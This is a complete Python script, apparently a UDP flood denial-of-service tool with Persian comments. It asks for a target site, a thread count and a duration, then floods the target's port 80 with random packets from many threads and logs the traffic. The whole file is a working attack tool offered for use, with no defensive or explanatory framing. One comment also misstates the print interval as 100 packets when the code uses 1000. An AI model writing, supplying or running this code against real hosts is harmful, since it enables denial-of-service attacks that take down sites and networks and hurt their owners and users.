import time
import socket
import sys
import random
import string
import logging
import signal
from concurrent.futures import ThreadPoolExecutor

site = input("Enter your site URL (e.g., example.com) => ")
thread_count = int(input("Enter the number of threads => "))
duration = int(input("Enter the attack duration (in seconds) => "))

try:
    ip = socket.gethostbyname(site)
except socket.gaierror:
    print("Error: Could not resolve the domain name. Please check the URL or your internet connection.")
    sys.exit(1)

UDP_PORT = 80
packet_count = 0
logging.basicConfig(filename='ddos.log', level=logging.INFO, format='%(asctime)s - %(message)s')

def generate_random_message(size=1024):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=size))

MESSAGE = generate_random_message()

def signal_handler(sig, frame):
    print("\nAttack stopped by user.")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

def ddos(i):
    global packet_count
    start_time = time.time()
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # ایجاد سوکت خارج از حلقه
    while time.time() - start_time < duration:
        try:
            sock.sendto(bytes(MESSAGE, "UTF-8"), (ip, UDP_PORT))
            packet_count += 1
            if packet_count % 1000 == 0:  # چاپ پیام هر ۱۰۰ بسته
                print(f"Packet sent from thread {i}. Total packets: {packet_count}")
                logging.info(f"Packet sent from thread {i}")
        except Exception as e:
            print(f"Error in thread {i}: {e}")
            logging.error(f"Error in thread {i}: {e}")
    print(f"Thread {i} finished.")

print(f"Starting attack on {ip} with {thread_count} threads for {duration} seconds...")
time.sleep(3)

with ThreadPoolExecutor(max_workers=thread_count) as executor:
    futures = [executor.submit(ddos, f"thread-{i}") for i in range(thread_count)]
    for future in futures:
        future.result()

print(f"Attack finished. Total packets sent: {packet_count}")